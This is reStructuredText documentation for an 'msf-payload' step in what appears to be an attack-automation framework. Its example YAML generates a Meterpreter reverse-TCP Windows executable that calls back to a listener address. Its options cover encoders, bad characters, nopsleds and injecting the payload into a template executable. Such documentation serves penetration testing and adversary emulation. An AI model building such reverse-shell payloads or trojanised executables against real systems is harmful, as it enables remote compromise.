===========
msf-payload
===========

Generate metasploit payloads and save the payload to a file.

.. code-block:: yaml

   - type: msf-payload
     cmd: windows/meterpreter/reverse_tcp
     format: exe
     payload_options:
       LHOST: 192.168.100.1
       LPORT: 1111
     local_path: /tmp/payload.exe

   - type: shell
     cmd: cat $LAST_MSF_PAYLOAD

.. confval:: cmd

   The payload to generate.

   :type: str
   :required: ``True``

.. confval:: format

   Generate the payload in this format. See metasploit documentation to find out the supported formats

   :type: str
   :default: ``raw``

.. confval:: payload_options

   Typical payload_options are LHOST or LPORT for reverse shells. Dict(key/values) of payload options.

   :type: Dict[str,str]

.. confval:: local_path

   Copy the payload to this local path.
   If not set, the payload will be saved in a temporary path.

   :type: str

.. confval:: badchars

   Characters to avoid example: '\x00\xff'

   :type: str

.. confval:: force_encode

   Force encoding

   :type: bool
   :default: ``False``

.. confval:: encoder

   The encoder to use. ``msfvenom --list  encoders`` to list

   :type: str

.. confval:: template

   Specify a custom executable file to use as a template

   :type: str(path)

.. confval:: platform

   The platform for the payload. ``msfvenom --list platforms`` to list

   :type: str

.. confval:: keep_template_working

   Preserve the template behaviour and inject the payload as a new thread

   :type: bool
   :default: ``False``

.. confval:: nopsled_size

   Prepend a nopsled of [length] size on to the payload

   :type: int
   :default: ``0``

.. confval:: iter

   The number of times to encode the payload

   :type: int
   :default: ``0``
